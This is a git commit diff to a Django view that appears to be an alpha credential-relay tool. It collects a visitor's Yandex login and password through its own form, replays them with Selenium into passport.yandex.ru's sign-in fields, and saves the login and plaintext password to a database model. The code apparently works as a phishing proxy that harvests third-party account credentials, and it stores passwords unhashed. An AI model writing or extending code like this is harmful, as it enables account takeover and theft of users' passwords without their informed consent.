8e496b008614d63fe8043b242cf8d1e2c5402087
Anton Sliusar <63955212+lamertoxa@users.noreply.github.com>
2023-04-22 16:06:18 +0300

    Alpha version of a working program

--- authentication/views.py
+++ authentication/views.py
@@ -7,13 +7,7 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from asgiref.sync import sync_to_async
-
-class User:
-    def __init__(self, login=None, password=None, phone=None, driver=None):
-        self.login = login
-        self.password = password
-        self.phone = phone
-        self.driver = driver
+from .models import CustomUser
 
 selenium_drivers = {}
 
@@ -22,28 +16,29 @@ async def index(request):
     driver = await get_driver(request, client_ip)
 
     if request.method == 'POST':
-
         if driver is not None and driver.current_window_handle:
             login = request.POST.get('login')
-            password = request.POST.get('password')
+            password = request.POST.get('passwd')
             phone = request.POST.get('phone')
-
             if password:
-                pass
+
+                await asyncio.to_thread(sign_in,driver,password)
+
+                custom_user = CustomUser(login=login, password=password)
+                await sync_to_async(custom_user.save)()
             elif login:
                 await asyncio.to_thread(open_yandex_passport, driver)
                 username_login = WebDriverWait(driver, 10).until(
-                    EC.presence_of_element_located((By.ID, 'passp-field-login'))
+                    EC.presence_of_element_located((By.NAME, 'login'))
                 )
                 login_submit = driver.find_element(By.ID, "passp:sign-in")
                 username_login.send_keys(login)
                 login_submit.click()
-                new_user = User(login=login)
+
                 return await sync_to_async(render)(request, 'welcome.html',
                                                    {'login_name': username_login.get_attribute('value')})
-
             elif phone:
-                new_user = User(phone=phone)
+                pass
             else:
                 messages.error(request, 'Please enter login or phone')
                 return await sync_to_async(render)(request, 'index.html')
@@ -60,6 +55,14 @@ def create_selenium_driver():
 
 def open_yandex_passport(driver):
     driver.get("https://passport.yandex.ru")
+
+def sign_in(driver,password):
+    username_login = WebDriverWait(driver, 10).until(
+        EC.presence_of_element_located((By.NAME, 'passwd'))
+    )
+    login_submit = driver.find_element(By.ID, "passp:sign-in")
+    username_login.send_keys(password)
+    login_submit.click()
 
 async def get_driver(request, client_ip):
     if client_ip not in selenium_drivers:
